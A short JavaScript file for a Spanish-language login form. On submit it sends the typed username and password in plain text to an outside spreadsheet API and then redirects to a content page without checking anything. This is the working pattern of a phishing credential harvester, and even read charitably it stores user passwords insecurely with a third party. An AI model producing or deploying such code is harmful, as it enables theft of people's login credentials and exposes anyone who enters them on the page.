const formulario = document.getElementById('formulario');
const container = document.getElementById('container');

formulario.addEventListener('submit', async (e) => {
  e.preventDefault();

  await fetch('https://sheet.best/api/sheets/598774e8-7bf2-4c25-8320-1e45dd00adf6', {
    method: 'POST',
    mode: 'cors',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({
      "Usuario": formulario.username.value,
      "Contraseña": formulario.password.value,
    })
  });

  window.location.href = "Contenido.html";
});
